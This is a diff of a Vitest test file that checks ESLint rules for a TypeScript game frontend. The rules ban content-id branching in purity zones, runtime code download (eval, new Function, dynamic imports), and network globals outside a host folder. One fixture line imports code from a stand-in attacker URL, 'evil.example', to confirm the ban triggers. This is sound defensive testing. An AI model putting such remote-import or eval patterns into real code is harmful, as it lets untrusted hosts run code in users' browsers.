@@ -2,7 +2,12 @@ import path from 'node:path';
 import { ESLint } from 'eslint';
 import tseslint from 'typescript-eslint';
 import { beforeAll, describe, expect, it } from 'vitest';
-import { i18nextJsxBlock, purityZoneBlock } from './eslint-rules.ts';
+import {
+  downloadBanBlock,
+  i18nextJsxBlock,
+  networkGlobalsBlock,
+  purityZoneBlock,
+} from './eslint-rules.ts';
 
 const FRONTEND_ROOT = path.resolve(import.meta.dirname, '..');
 
@@ -20,8 +25,11 @@ beforeAll(() => {
           parser: tseslint.parser,
           parserOptions: { ecmaFeatures: { jsx: true } },
         },
+        plugins: { '@typescript-eslint': tseslint.plugin },
       },
       purityZoneBlock,
+      downloadBanBlock,
+      networkGlobalsBlock,
       i18nextJsxBlock,
     ],
   });
@@ -83,6 +91,88 @@ describe('purity zones', () => {
     expect(ruleIds).not.toContain('no-restricted-properties');
     expect(ruleIds).not.toContain('no-restricted-globals');
     expect(ruleIds).not.toContain('no-restricted-syntax');
+  });
+});
+
+describe('content/mode id literals', () => {
+  it.each(PURITY_ZONES)('flags id-literal branching in %s', async (filePath) => {
+    const code = [
+      "export const f = (id: string) => id === 'frontline_td:rifle';",
+      'export const g = (id: string) => {',
+      '  switch (id) {',
+      "    case 'frontline_td:railgun':",
+      '      return 1;',
+      '    default:',
+      '      return 0;',
+      '  }',
+      '};',
+    ].join('\n');
+    const ruleIds = await ruleIdsFor(filePath, code);
+    expect(ruleIds).toContain('no-restricted-syntax');
+  });
+
+  it('does not flag id definitions or non-branching literals', async () => {
+    const code = [
+      "export const CMD = 'frontline_td:rally';",
+      "export const id: string = 'frontline_td:rally';",
+      'export const set = new Set([CMD]);',
+    ].join('\n');
+    const ruleIds = await ruleIdsFor('src/core/x.ts', code);
+    expect(ruleIds).not.toContain('no-restricted-syntax');
+  });
+
+  it('does not flag id literals outside purity zones', async () => {
+    const ruleIds = await ruleIdsFor(
+      'src/client/x.ts',
+      "export const f = (id: string) => id === 'frontline_td:rally';\n",
+    );
+    expect(ruleIds).not.toContain('no-restricted-syntax');
+  });
+});
+
+describe('runtime code download ban', () => {
+  it.each(['src/client/x.ts', 'src/app/x.ts', 'src/core/x.ts'])(
+    'flags eval/new Function/dynamic imports in %s',
+    async (filePath) => {
+      const ruleIds = await ruleIdsFor(
+        filePath,
+        [
+          "export const a = eval('1');",
+          'export const b = new Function("x", "return x");',
+          'export async function c(m: string) { return import(m); }',
+          'export async function d() { return import("https://evil.example/x.js"); }',
+        ].join('\n'),
+      );
+      expect(ruleIds).toContain('no-eval');
+      expect(ruleIds).toContain('no-new-func');
+      expect(ruleIds).toContain('no-restricted-syntax');
+    },
+  );
+
+  it('allows a static literal relative import()', async () => {
+    const ruleIds = await ruleIdsFor(
+      'src/client/x.ts',
+      'export async function c() { return import("./y.js"); }\n',
+    );
+    expect(ruleIds).not.toContain('no-restricted-syntax');
+  });
+});
+
+describe('network globals', () => {
+  it('flags fetch/WebSocket outside host/', async () => {
+    const ruleIds = await ruleIdsFor(
+      'src/client/net.ts',
+      'export const f = () => { fetch("/x"); return new WebSocket("wss://x"); };\n',
+    );
+    expect(ruleIds).toContain('no-restricted-globals');
+  });
+
+  it('allows network globals inside host/', async () => {
+    const ruleIds = await ruleIdsFor(
+      'src/host/net.ts',
+      'export const f = () => { fetch("/x"); return new WebSocket("wss://x"); };\n',
+    );
+    expect(ruleIds).not.toContain('no-restricted-globals');
   });
 });
 
